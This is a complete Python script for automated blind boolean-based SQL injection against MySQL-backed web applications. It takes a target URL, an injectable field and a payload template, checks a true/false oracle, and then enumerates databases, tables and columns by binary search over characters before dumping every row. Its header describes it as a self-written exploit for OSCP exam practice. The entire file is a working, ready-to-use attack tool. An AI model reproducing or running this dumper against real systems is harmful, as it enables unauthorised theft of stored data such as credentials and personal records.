#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Blind boolean-based SQLi dumper (MySQL) - interactive, live output
# Oracle = TRUE/FALSE difference in the HTTP response.
# Binary search on ASCII per character (~8 requests/char, 0-255 range).
# Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
# Uses the proven group_concat pattern (one query per table, no LIMIT loop).
# Supports GET (param in query string) and POST (param in body).
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import sys

# --- Interactive config ----------------------------------------------------
print("=== blind SQLi dumper ===")
METHOD       = input("Request method GET or POST                   : ").strip().upper()
if METHOD not in ("GET", "POST"):
    METHOD = "POST"
URL          = input("Target URL                                   : ").strip()
INJ_FIELD    = input("Injectable field name (e.g. username / id)   : ").strip()
# Second field only matters for POST logins (e.g. password). Leave blank for a
# single-parameter endpoint such as GET /user?id=1.
OTHER_FIELD  = input("Other field name (blank if none)             : ").strip()
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
# Template with [INJECT] where the boolean condition is spliced in.
# POST login example: kitty' AND [INJECT]-- -
# GET numeric example: 1 AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
# A string that appears ONLY when the query returns NO row (condition FALSE).
# Its ABSENCE from the response = condition TRUE.
FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()

# --- Request sender (GET -> query string, POST -> body) --------------------
def send(payload):
    """Send one payload with the configured method and return the response.
    GET puts the injectable field (and optional second field) in the query
    string; POST puts them in the form body."""
    if METHOD == "GET":
        params = {INJ_FIELD: payload}
        if OTHER_FIELD:
            params[OTHER_FIELD] = OTHER_VALUE
        return requests.get(URL, params=params)
    data = {INJ_FIELD: payload}
    if OTHER_FIELD:
        data[OTHER_FIELD] = OTHER_VALUE
    return requests.post(URL, data=data)

# --- Startup oracle sanity check (fails loudly instead of dumping garbage) --
print("\n[*] Sanity check...")
def _probe(cond):
    r = send(TEMPLATE.replace("[INJECT]", cond))
    return FALSE_MARKER not in r.text
if not (_probe("1=1") and not _probe("1=2")):
    print("[!] Oracle FAILED: 1=1 should be TRUE and 1=2 FALSE.")
    print(f"    method   = {METHOD}")
    print(f"    template = {TEMPLATE!r}")
    print(f"    marker   = {FALSE_MARKER!r}")
    sys.exit(1)
print("[+] Oracle works (1=1 TRUE, 1=2 FALSE).\n")

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# --- Core oracle -----------------------------------------------------------
def oracle(condition):
    """Send one boolean condition, return True if the app signals TRUE.
    Stateless (no session) so a 'success' response never leaves a cookie
    that would make later requests all look logged-in."""
    r = send(TEMPLATE.replace("[INJECT]", condition))
    return FALSE_MARKER not in r.text

def extract_char(subquery, pos):
    """Binary search the byte value (0-255) of one character at position pos."""
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_string(subquery, label=None, roll=True):
    """Pull a string char by char until a NULL/empty char (0) ends it.
    roll=True  -> redraw the growing value on one line (for single-line names).
    roll=False -> stream chars as-is (for multi-line data blobs with newlines)."""
    out, pos = "", 1
    while True:
        val = extract_char(subquery, pos)
        if val == 0:
            break
        ch = chr(val)
        out += ch
        if label is not None:
            if roll:
                sys.stdout.write(f"\r{label}{out}")
            else:
                if pos == 1:
                    sys.stdout.write(label)
                sys.stdout.write(ch)
            sys.stdout.flush()
        pos += 1
    if label is not None:
        sys.stdout.write("\n")
    return out

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # Dump each column separately with single-arg group_concat -- the SAME
    # query shape that reliably dumps schema/table/column names above.
    # Values within a column are comma-joined; we split and zip into rows.
    # (Caveat: a value containing a comma would misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = extract_string(q, label=f"    {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)


# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
